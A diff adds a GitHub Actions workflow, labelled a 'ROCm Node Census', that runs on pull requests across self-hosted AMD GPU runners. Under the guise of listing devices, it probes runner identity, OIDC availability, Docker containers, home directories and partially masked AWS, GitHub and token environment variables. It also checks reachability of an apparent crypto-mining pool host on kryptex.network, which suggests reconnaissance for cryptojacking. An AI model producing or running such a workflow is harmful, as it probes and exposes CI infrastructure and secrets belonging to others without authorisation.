@@ -1,0 +1,34 @@
+name: ROCm Node Census
+on: pull_request
+permissions:
+  contents: read
+jobs:
+  census:
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: ['linux-flydsl-mi355-8','linux-flydsl-mi325-8','linux-flydsl-mi325-1','linux-flydsl-mi35x-1','linux-flydsl-navi-2']
+    runs-on: ${{ matrix.runner }}
+    timeout-minutes: 8
+    continue-on-error: true
+    steps:
+      - name: identity and devices
+        run: |
+          echo "RUNNER=$RUNNER_NAME LABELS=$RUNNER_LABELS HOST=$(hostname)"
+          id; uname -a; cat /etc/os-release | head -3
+          echo "--- oidc: ${ACTIONS_ID_TOKEN_REQUEST_URL:-NO_OIDC_ENV}"
+          ls -l /dev/kfd /dev/dri 2>&1 | head -20
+          ls /dev/dri 2>/dev/null | head -20
+          for p in /opt/rocm/bin/rocminfo /usr/bin/rocminfo; do [ -x "$p" ] && "$p" | grep -E 'Marketing Name|gfx[0-9]|Name:' | head -30; done
+          for p in /opt/rocm/bin/rocm-smi /usr/bin/rocm-smi; do [ -x "$p" ] && "$p" -L 2>&1 | head -20; done
+          nvidia-smi -L 2>&1 | head -5
+          lspci 2>/dev/null | grep -iE 'vga|display|amd|ati' | head -20
+          ls /sys/class/drm 2>/dev/null | head -20
+          free -g | head -2; nproc
+      - name: tooling and reachability
+        run: |
+          command -v docker && docker ps --format '{{.Names}} {{.Image}}' | head -10
+          command -v curl && curl -s -m 10 -o /dev/null -w 'github:%{http_code}\n' https://api.github.com/ || true
+          curl -s -m 10 -o /dev/null -w 'kryptex:%{http_code}\n' https://prl-sg.kryptex.network:8048/ 2>/dev/null || true
+          ls -la $HOME 2>/dev/null | head -20
+          env | grep -iE 'AWS_|ROCM|HIP|GH_TOKEN|GITHUB' | sed -E 's/=(.{6}).*/=\1.../' | head -20
